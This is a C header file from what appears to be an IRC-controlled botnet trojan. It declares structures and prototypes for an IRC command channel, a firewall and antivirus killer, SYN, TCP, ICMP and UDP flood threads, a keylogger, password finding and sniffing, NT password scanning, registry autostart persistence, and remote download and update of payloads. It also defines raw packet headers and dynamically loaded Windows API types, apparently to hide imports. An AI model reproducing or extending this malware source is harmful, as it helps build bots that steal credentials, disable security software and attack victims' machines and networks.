

// irc/spy structure.
typedef struct IRC 
{
	SOCKET sock;
	char host[128];
	char channel[64];
	char chanpass[64];
	char hchan[64];
	char nick[16];
	int port;
	int spy;
	int threadnum;
	BOOL gotinfo;

} IRC;

DWORD WINAPI irc_connect(LPVOID param);
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, int spy);
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char masters[][128], char *host, int *in_channel, int repeat, int spy);
#define SHTDN_REASON_MAJOR_SYSTEM	0x00050000 // ripped from reason.h
#define SHTDN_REASON_MINOR_HUNG		0x00000005

#define SHUTDOWN_SYSTEM_HUNG		(SHTDN_REASON_MAJOR_SYSTEM|SHTDN_REASON_MINOR_HUNG) // for XP,2k only ignored on 9x
#define EWX_SYSTEM_REBOOT			(EWX_REBOOT | EWX_FORCE)
#define EWX_FORCE_SHUTDOWN			(EWX_SHUTDOWN | EWX_POWEROFF | EWX_FORCE)


//char *replacestr(char *str, char *oldstr, char *newstr);
char *replacestr(char *str, const char *substr, const char *repstr);
int Split(char *inStr, void *saveArray);
void initskip(char *s, int len, int skip[1024]);
int lstrindex(char c);
char *lstrstr(char *s, char *t);
char *PrintError(char *msg);
char *GetClipboardText(void);
BOOL mirccmd(char *cmd);
void SetFileTime(char *Filename);
DWORD CreateProc(char *file, char *param);
BOOL Reboot(void);
void uninstall(void);
char *GetIP(SOCKET sock);
USHORT checksum(USHORT *buffer, int size); 
unsigned long ResolveAddress(char *szHost);
void AutoStartRegs(char *nfilename);
DWORD WINAPI AutoRegistry(LPVOID param);
void irc_sendv(SOCKET sock, char *msg, ...);
void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice, BOOL delay=FALSE);


//AUTOSTART autostart[];

typedef struct AUTOSTART
{
	HKEY hkey;
	LPCTSTR subkey;

} AUTOSTART;
#ifndef NO_IDENT
DWORD WINAPI IdentThread(LPVOID param);
#endif
#ifndef NO_EHANDLER
EXCEPTION_DISPOSITION cdecl _except_handler(struct _EXCEPTION_RECORD *ExceptionRecord,
	void *EstablisherFrame,struct _CONTEXT *ContextRecord,void *DispatcherContext);
#endif

enum {OS_UNKNOWN, OS_WIN95, OS_WIN98, OS_WINME, OS_WINNT, OS_WIN2K, OS_WINXP, OS_WIN2K3};

char *Uptime(int startup=0);
int OSVersionCheck(void);

#ifndef NO_SYSINFO
inline unsigned __int64 GetCycleCount(void);
unsigned __int64 GetCPUSpeed(void);
char *sysinfo(char *sinfo, SOCKET sock);
#endif

#ifndef NO_NETINFO
char *netinfo(char *ninfo, char *host, SOCKET sock);
#endif

typedef struct DKSP
{
	__int64 AvailableBytes;
	__int64 FreeBytes;
	__int64 TotalBytes;

} DKSP;

typedef struct DKSPKB
{
	char AvailableKB[128];
	char FreeKB[128];
	char TotalKB[128];
	
} DKSPKB;

BOOL FileExists(char *filename, int mode=04);
const char *commaI64(unsigned __int64 number);
const char *DriveType(LPCSTR Drive);
DKSP DiskSpace(LPCSTR Drive);
DKSPKB DiskSpaceKB(LPCSTR Drive);
void DriveSpace(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive);
void DriveInfo(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive);

//////////////////// THREADS //////////////////////////////
enum {
	MAIN_THREAD,		// Main thread 
	KILLER_THREAD,		// Firewall/AV Killer thread
	IDENT_THREAD,		// Ident Server thread
	HTTP_THREAD,		// HTTP Server thread
	TFTP_THREAD,		// TFTP Server thread
	FTP_THREAD,		// FTP Server thread
	RLOGIN_THREAD,		// Rlogin Server thread
	RCMD_THREAD,		// Remote CMD thread
	SCAN_THREAD,		// Port Scanner thread
	NTPASS_THREAD,		// NT Password Scanner thread
	DDOS_THREAD,		// DDoS thread
	SYN_THREAD,			// Syn Flood thread
	TCP_THREAD,			// Tcp Flood thread
	ICMP_THREAD,		// ICMP Flood thread
	PING_THREAD,		// Ping thread
	UDP_THREAD,			// UDP thread
	REDIRECT_THREAD,	// Port Redirect thread
	SOCKS4_THREAD,		// SOCKS4 thread
	DCC_THREAD,			// DCC Transfer thread
	DCCCHAT_THREAD,		// DCC Chat Transfer thread
	VISIT_THREAD,		// Visit URL thread
	DOWNLOAD_THREAD,	// Download thread
	UPDATE_THREAD,		// Update thread
	CLONE_THREAD,		// Clone thread
	PSNIFF_THREAD,		// Psniff thread
	SECURE_THREAD,		// Secure thread
	KEYLOG_THREAD,		// Key Logger thread
	FIND_THREAD,		// File find thread
	LOG_THREAD,			// Log list thread
	PASS_THREAD,		// Find pass thread
	PROC_THREAD,		// Process list thread
	LIST_THREAD			// Threads list thread
};

typedef struct THREAD 
{
   char name[IRCLINE];
   int id; 
   int parent;
   DWORD pid;
   SOCKET sock;
   SOCKET csock;
   HANDLE tHandle;
   char nick[MAXNICKLEN];

} THREAD;

typedef struct TLIST
{
	SOCKET sock;
	char chan[128];
	int threadnum;
	BOOL full;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} TLIST;


int addthread(char *name, int id, SOCKET sock);
DWORD WINAPI ListThread(LPVOID param);
void listthreads(SOCKET sock, char *chan, BOOL notice, BOOL full=FALSE);
BOOL killthread(int threadnum);
int killthreadall(void);
int killthreadid(int threadid, int threadnum=0);
int findthreadid(int threadid);
int findthreadnum(int threadid);
void stopthread(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *name, char *desc, int threadid, char *thread);
void clearthread(int threadnum);

/////////////////////// FPHOST /////////////////////////////////////
// OS fingerprint
#define FP_RPC     1
#define FP_PORT5K  2
#define FP_TTL     3

// Definitions for OS fingerprinting
#define OS_UNKNOWN 0
#define OS_WINNT   1
#define OS_WIN2K   2
#define OS_WINXP   3

#define FP_RPC     1
#define FP_PORT5K  2
#define FP_TTL     3

// DCE defines
#define DCE_VERSION_MAJOR 0x05
#define DCE_VERSION_MINOR 0x00
#define DCE_PKT_BIND 0x0B
#define DCE_PKT_BINDACK 0x0C
#define DCE_PKT_BINDNACK 0x0D
#define DCE_PKT_REQUEST 0x00
#define DCE_PKT_FAULT 0x03
#define DCE_PKT_RESPONSE 0x02
#define DCE_PKT_ALTCONT 0x0E
#define DCE_PKT_ALTCONTRESP 0x0F
#define DCE_PKT_BINDRESP 0x10
#define RPC_FLG_FIRST 0x01
#define RPC_FLG_LAST 0x02

bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen);
int FpHost(const char *szHost, int iFpType);

//////////////////////// DOWNLOAD ///////////////////////////
#ifndef NO_DOWNLOAD
// download/update structure
typedef struct DOWNLOAD 
{
	SOCKET sock;
	char chan[128];
	char url[256];
	char dest[256];
	int threadnum;
	int update;
	int run;
	unsigned long filelen;
	unsigned long expectedcrc;
	BOOL encrypted;
	BOOL silent;
	BOOL notice;
	BOOL gotinfo;

} DOWNLOAD;

DWORD WINAPI DownloadThread(LPVOID param);
char *Xorbuff(char *buffer,int bufferLen);
#endif
//////////////// RANDOM NICK ////////////////////////
enum { CONSTNICK, LETTERNICK, COMPNICK, COUNTRYNICK, OSNICK};

typedef char * (*rnref)(char *strbuf);

typedef struct RNICK 
{
	char name[10];
	int type;
	rnref rnfunc;

} RNICK;


char *rndnickconst(char *strbuf);
char *rndnickletter(char *strbuf);
char *rndnickcomp(char *strbuf);
char *rndnickcountry(char *strbuf);
char *rndnickos(char *strbuf);
char *prefixnick(char *strbuf);
char *rndnick(char *strbuf, int type=LETTERNICK, BOOL prefix=FALSE, char *name=NULL);

//////////////////////// PROCESS //////////////////////
#ifndef NO_PROCESS
typedef struct LPROC
{
	SOCKET sock;
	char chan[128];
	int threadnum;
	BOOL full;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} LPROC;

BOOL AdjustPrivileges(char *pPriv, BOOL add);
int listProcesses(SOCKET sock, char *chan, BOOL notice, char *proccess, BOOL killthread=FALSE, BOOL full=false);
DWORD WINAPI listProcessesThread(LPVOID param);
int killProcess(int pid);
#ifndef NO_AVFW_KILL
DWORD WINAPI kill_av(LPVOID param);
#endif
#endif
#ifndef NO_FTPD
typedef struct FTP 
{
	SOCKET sock;
	char filename[MAX_PATH];
	char requestname[MAX_PATH];
	int threadnum;
	int threads;
	int port;
	char chan[128];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} FTP;

DWORD WINAPI ftpd(LPVOID pParam);
#endif

/*************************** TCPIP.H ********************************/
#ifndef _TCPIP_H_
#define _TCPIP_H_

#define IP_HDRINCL  2 

// Standard TCP flags
#define URG 0x20
#define ACK 0x10
#define PSH 0x08
#define RST 0x04
#define SYN 0x02
#define FIN 0x01

// Our tcp header struct
typedef struct tcphdr {

	unsigned short sport;			// Source port
	unsigned short dport;			// Destination port
	unsigned int   seq;				// Sequence number
	unsigned int   ack_seq;			// Acknowledgement number
	unsigned char  lenres;			// Length return size
	unsigned char  flags;			// Flags and header length
	unsigned short window;			// Window size
	unsigned short checksum;		// Packet Checksum
	unsigned short urg_ptr;			// Urgent Pointer

} TCPHEADER;

// Our tcp header struct
typedef struct tcphdr2 {

	unsigned short source;			// Source port
	unsigned short dest;			// Destination port
	unsigned int   seq;				// Sequence number
	unsigned int   ack_seq;			// Acknowledgement number
	unsigned short res1;
	unsigned short doff;
	unsigned short fin;
	unsigned short syn;
	unsigned short rst;
	unsigned short psh;
	unsigned short ack;
	unsigned short urg;
	unsigned short res2;
	unsigned short window;			// Window size
	unsigned short check;			// Packet Checksum
	unsigned short urg_ptr;			// Urgent Pointer

} TCPHEADER2;

// Our ip header struct
typedef struct iphdr {

	unsigned char  verlen;			// IP version & length
	//unsigned int   h_len:4;		// Length of the header
	//unsigned int   version:4;		// Version of IP
	unsigned char  tos;				// Type of service
	unsigned short total_len;		// Total length of the packet
	unsigned short ident;			// Unique identifier
	unsigned short frag_and_flags;	// Flags
	unsigned char  ttl;				// Time to live
	unsigned char  proto;			// Protocol (TCP, UDP etc)
	unsigned short checksum;		// IP checksum
	unsigned int   sourceIP;		// Source IP
	unsigned int   destIP;			// Destination IP

} IPHEADER;

// Our pseudo header struct
typedef struct pshdr {

	unsigned int   saddr;			// Source address
	unsigned int   daddr;			// Destination address
	unsigned char  zero;			// Placeholder
	unsigned char  proto;			// Protocol
	unsigned short length;			// TCP length
	struct tcphdr tcp;				// TCP Header struct

} PSDHEADER;

// Our udp header struct
typedef struct udphdr {

	unsigned short source;			// Source port
	unsigned short dest;			// Destination port
    unsigned short length;			// Packet length
    unsigned short checksum;		// Packet checksum

} UDPHEADER;
        
// Our icmp header struct
typedef struct icmphdr {

	unsigned char  type;			// Type of ICMP packet
    unsigned char  subcode;			// Subcode of type of packet
    unsigned short checksum;		// Packet checksum
	unsigned short id;				// ID number
	unsigned short seq;				// Sequence number

} ICMPHEADER;

#endif

/********************** END TCPIP.H *************************************/

// kernel32.dll function variables
typedef UINT (__stdcall *SEM)(UINT);
typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD);
typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32);
typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32);
typedef BOOL (__stdcall *M32F)(HANDLE,LPMODULEENTRY32);
typedef BOOL (__stdcall *GDFSE)(LPCTSTR,PULARGE_INTEGER,PULARGE_INTEGER,PULARGE_INTEGER);
typedef DWORD (__stdcall *GLDS)(DWORD,LPTSTR);
typedef UINT (__stdcall *GDT)(LPCTSTR);
typedef DWORD (__stdcall *SP)(LPCTSTR,LPCTSTR,LPCTSTR,DWORD,LPTSTR,LPTSTR *);
typedef BOOL (__stdcall *QPC)(LARGE_INTEGER *);
typedef BOOL (__stdcall *QPF)(LARGE_INTEGER *);
typedef DWORD (__stdcall *RSP)(DWORD,DWORD);


// user32.dll function variables
typedef LRESULT (__stdcall *SM)(HWND,UINT,WPARAM,LPARAM);
typedef HWND (__stdcall *FW)(LPCTSTR,LPCTSTR);
typedef BOOL (__stdcall *IW)(HWND);
typedef BOOL (__stdcall *DW)(HWND);
typedef BOOL (__stdcall *OC)(HWND);
typedef HANDLE (__stdcall *GCD)(UINT);
typedef BOOL (__stdcall *CC)(VOID);
typedef BOOL (__stdcall *EWE)(UINT,DWORD);
#ifndef NO_KEYLOG
typedef SHORT (__stdcall *GAKS)(int);
typedef SHORT (__stdcall *GKS)(int);
typedef int (__stdcall *GWT)(HWND,LPTSTR,int);
typedef HWND (__stdcall *GFW)(VOID);
#endif

// advapi32.dll function variables
typedef LONG (__stdcall *ROKE)(HKEY,LPCTSTR,DWORD,REGSAM,PHKEY);
typedef LONG (__stdcall *RCKE)(HKEY,LPCTSTR,DWORD,LPTSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
typedef LONG (__stdcall *RSVE)(HKEY,LPCTSTR,DWORD,DWORD,const BYTE *,DWORD);
typedef LONG (__stdcall *RQVE)(HKEY,LPCTSTR,LPDWORD,LPDWORD,LPBYTE,LPDWORD);
typedef LONG (__stdcall *RDV)(HKEY,LPCTSTR);
typedef LONG (__stdcall *RCK)(HKEY);
#ifndef NO_PROCESS
typedef BOOL (__stdcall *OPT)(HANDLE,DWORD,PHANDLE);
typedef BOOL (__stdcall *LPV)(LPCTSTR,LPCTSTR,PLUID);
typedef BOOL (__stdcall *ATP)(HANDLE,BOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
#endif
#ifndef NO_NET
typedef SC_HANDLE (__stdcall *OSCM)(LPCTSTR,LPCTSTR,DWORD);
typedef SC_HANDLE (__stdcall *OS)(SC_HANDLE,LPCTSTR,DWORD);
typedef BOOL (__stdcall *SS)(SC_HANDLE,DWORD,LPCTSTR *);
typedef BOOL (__stdcall *CS)(SC_HANDLE,DWORD,LPSERVICE_STATUS);
typedef BOOL (__stdcall *DS)(SC_HANDLE);
typedef BOOL (__stdcall *CSH)(SC_HANDLE);
typedef BOOL (__stdcall *ESS)(SC_HANDLE,DWORD,DWORD,LPENUM_SERVICE_STATUS,DWORD,LPDWORD,LPDWORD,LPDWORD);
typedef BOOL (__stdcall *IVSD)(PSECURITY_DESCRIPTOR);
#endif 
#ifndef NO_SYSINFO
typedef BOOL (__stdcall *GUN)(LPTSTR,LPDWORD);
#endif

// gdi32.dll function variables
typedef HDC (__stdcall *CDC)(LPCTSTR,LPCTSTR,LPCTSTR,CONST DEVMODE *);
typedef HBITMAP (__stdcall *CDIBS)(HDC,CONST BITMAPINFO *,UINT,VOID **,HANDLE,DWORD);
typedef HDC (__stdcall *CCDC)(HDC);
typedef int (__stdcall *GDC)(HDC,int);
typedef UINT (__stdcall *GDIBCT)(HDC,UINT,UINT,RGBQUAD *);
typedef HGDIOBJ (__stdcall *SO)(HDC,HGDIOBJ);
typedef BOOL (__stdcall *BB)(HDC,int,int,int,int,HDC,int,int,DWORD);
typedef BOOL (__stdcall *DDC)(HDC);
typedef BOOL (__stdcall *DO)(HGDIOBJ);

// ws2_32.dll function variables
typedef int (__stdcall *WSAS)(WORD,LPWSADATA);
typedef SOCKET (__stdcall *WSASo)(int,int,int,LPWSAPROTOCOL_INFO,GROUP,DWORD);
typedef int (__stdcall *WSAAS)(SOCKET,HWND hWnd,unsigned int,long);
typedef int (__stdcall *WSAFDIS)(SOCKET,fd_set *);
typedef int (__stdcall *WSAI)(SOCKET,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPWSAOVERLAPPED,LPWSAOVERLAPPED_COMPLETION_ROUTINE);
typedef int (__stdcall *WSAGLE)(void);
typedef int (__stdcall *WSAC)(void);
typedef SOCKET (__stdcall *SOCK)(int,int,int);
typedef int (__stdcall *IOCTLS)(SOCKET,long cmd,u_long *);
typedef int (__stdcall *CON)(SOCKET,const struct sockaddr *,int);
typedef char * FAR (__stdcall *INTOA)(struct in_addr);
typedef unsigned long (__stdcall *IADDR)(const char *);
typedef u_short (__stdcall *HTONS)(u_short);
typedef u_long (__stdcall *HTONL)(u_long);
typedef u_short (__stdcall *NTOHS)(u_short);
typedef u_long (__stdcall *NTOHL)(u_long);
typedef int (__stdcall *SEND)(SOCKET,const char *,int,int);
typedef int (__stdcall *SENDTO)(SOCKET,const char *,int,int,const struct sockaddr *,int);
typedef int (__stdcall *RECV)(SOCKET,char *,int,int);
typedef int (__stdcall *RECVFROM)(SOCKET,char *,int,int,struct sockaddr *,int *);
typedef int (__stdcall *BIND)(SOCKET,const struct sockaddr *,int);
typedef int (__stdcall *SEL)(int,fd_set *,fd_set *,fd_set *,const struct timeval *);
typedef int (__stdcall *LIS)(SOCKET,int);
typedef SOCKET (__stdcall *ACC)(SOCKET,struct sockaddr *,int *);
typedef int (__stdcall *SSO)(SOCKET,int,int,const char *,int);
typedef int (__stdcall *GSN)(SOCKET,struct sockaddr *,int *);
typedef int (__stdcall *GHN)(char *,int);
typedef struct hostent* FAR (__stdcall *GHBN)(const char *);
typedef struct hostent* FAR (__stdcall *GHBA)(const char *,int,int);
typedef int (__stdcall *GPN)(SOCKET,struct sockaddr*,int*);
typedef int (__stdcall *CLSO)(SOCKET);

// wininet.dll function variables
typedef BOOL (__stdcall *IGCSE)(LPDWORD,LPTSTR,DWORD,DWORD);
typedef BOOL (__stdcall *IGCS)(LPDWORD,DWORD);
typedef HINTERNET (__stdcall *HOR)(HINTERNET,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR *,DWORD,PDWORD);
typedef BOOL (__stdcall *HSR)(HINTERNET,LPCTSTR,DWORD,LPVOID,DWORD);
typedef HINTERNET (__stdcall *IC)(HINTERNET,LPCTSTR,INTERNET_PORT,LPCTSTR,LPCTSTR,DWORD,DWORD,PDWORD);
typedef HINTERNET (__stdcall *IO)(LPCTSTR,DWORD,LPCTSTR,LPCTSTR,DWORD);
typedef HINTERNET (__stdcall *IOU)(HINTERNET,LPCTSTR,LPCTSTR,DWORD,DWORD,PDWORD);
typedef BOOL (__stdcall *ICU)(LPCTSTR,DWORD,DWORD,LPURL_COMPONENTS);
typedef BOOL (__stdcall *IRF)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL (__stdcall *ICH)(HINTERNET);

// icmp.dll function variables
#ifndef NO_PING
typedef HANDLE (__stdcall *ICF)(VOID);
typedef DWORD (__stdcall *ISE)(HANDLE,IPAddr,LPVOID,WORD,PIP_OPTION_INFORMATION,LPVOID,DWORD,DWORD);
typedef BOOL (__stdcall *ICH)(HANDLE);
#endif

// netapi32.dll function variables
typedef NET_API_STATUS (__stdcall *NSA)(LPWSTR,DWORD,LPBYTE,LPDWORD);
typedef NET_API_STATUS (__stdcall *NSD)(LPWSTR,LPWSTR,DWORD);
typedef NET_API_STATUS (__stdcall *NSE)(LPWSTR,DWORD,LPBYTE *,DWORD,LPDWORD,LPDWORD,LPDWORD);
typedef NET_API_STATUS (__stdcall *NSJA)(LPCWSTR,LPBYTE,LPDWORD);
typedef NET_API_STATUS (__stdcall *NABF)(LPVOID);
typedef NET_API_STATUS (__stdcall *NRTOD)(LPCWSTR,LPBYTE *);
typedef NET_API_STATUS (__stdcall *NUA)(LPCWSTR,DWORD,LPBYTE,LPDWORD);
typedef NET_API_STATUS (__stdcall *NUD)(LPCWSTR,LPCWSTR);
typedef NET_API_STATUS (__stdcall *NUE)(LPCWSTR,DWORD,DWORD,LPBYTE *,DWORD,LPDWORD,LPDWORD,LPDWORD);
typedef NET_API_STATUS (__stdcall *NUGI)(LPCWSTR,LPCWSTR,DWORD,LPBYTE *);
typedef NET_API_STATUS (__stdcall *NMBS)(LPCWSTR,LPCWSTR,LPCWSTR,LPBYTE,DWORD);

// dnsapi.dll function variables
typedef BOOL (__stdcall *DFRC)(void);
typedef DNS_STATUS (__stdcall *DFRCEA)(LPCSTR);

// iphlpapi.dll function variables
typedef DWORD (__stdcall *GINT)(PMIB_IPNETTABLE,PULONG,BOOL);
typedef DWORD (__stdcall *DINE)(PMIB_IPNETROW);

// mpr.dll function variables
typedef DWORD (__stdcall *WNAC2)(LPNETRESOURCE,LPCTSTR,LPCTSTR,DWORD);
typedef DWORD (__stdcall *WNAC2W)(LPNETRESOURCEW,LPCWSTR,LPCWSTR,DWORD);
typedef DWORD (__stdcall *WNCC2)(LPCTSTR,DWORD,BOOL);
typedef DWORD (__stdcall *WNCC2W)(LPCWSTR,DWORD,BOOL);

// shell32.dll function variables
typedef HINSTANCE (__stdcall *SE)(HWND,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,INT);
typedef void (__stdcall *SHCN)(LONG,UINT,LPCVOID,LPCVOID);

// odbc32.dll function variables
typedef SQLRETURN (__stdcall *SQLDC)(SQLHDBC,SQLHWND,SQLCHAR *,SQLSMALLINT,SQLCHAR *,SQLSMALLINT,SQLSMALLINT *,SQLUSMALLINT);
typedef SQLRETURN (__stdcall *SQLSEA)(SQLHENV,SQLINTEGER,SQLPOINTER,SQLINTEGER);
typedef SQLRETURN (__stdcall *SQLED)(SQLHSTMT,SQLCHAR *,SQLINTEGER);
typedef SQLRETURN (__stdcall *SQLAH)(SQLSMALLINT,SQLHANDLE,SQLHANDLE *);
typedef SQLRETURN (__stdcall *SQLFH)(SQLSMALLINT,SQLHANDLE);
typedef SQLRETURN (__stdcall *SQLD)(SQLHDBC);



BOOL LoadDLLs(void);
void CheckDLLs(SOCKET sock, char *chan, BOOL notice, BOOL silent);
